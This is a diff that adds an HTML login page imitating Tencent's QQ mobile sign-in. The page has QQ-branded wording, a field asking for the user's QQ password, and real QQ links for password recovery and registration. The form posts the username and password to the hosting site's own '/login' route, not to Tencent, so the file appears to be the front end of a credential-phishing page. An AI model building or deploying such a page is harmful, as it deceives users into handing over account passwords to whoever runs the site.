@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>手机统一登录</title>
+    <link rel="stylesheet" href="styles/style.css">
+</head>
+
+<body>
+    <div id="content" class="content">
+        <div id="login" class="login">
+            <div id="logo" class="logo"></div>
+            <div id="web_login">
+                <form action="/login" method="post">
+                    <div id="g_list">
+                        <div id="g_u">
+                            <input id="u" class="inputstyle" type="text" name="username" placeholder="QQ号码/手机/邮箱" required><br>
+                        </div>
+                        <input id="p" class="inputstyle" type="password" name="password" placeholder="请输入您的QQ密码" required><br>
+                    </div>
+                    <div id="auto_login" style="display: block">
+                        <input id="remember" type="checkbox" checked="checked">
+                        <span class="checkbox"></span>
+                        <label class="wording">记住登录状态</label>
+                    </div>
+                    <button id="go" class>登  录</button>
+                </form>
+            </div>
+            <div id="switch">
+                <div id="zc_feedback">
+                    <span id="forgetpwd"><a  class="underline" href="https://aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index?source_id=3263&ptlang=2052&account">忘了密码？</a></span>
+                    <span id="zc"><a class="underline" href="https://ssl.zc.qq.com/v3/index-chs.html?from=pt">注册新帐号</a></span>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
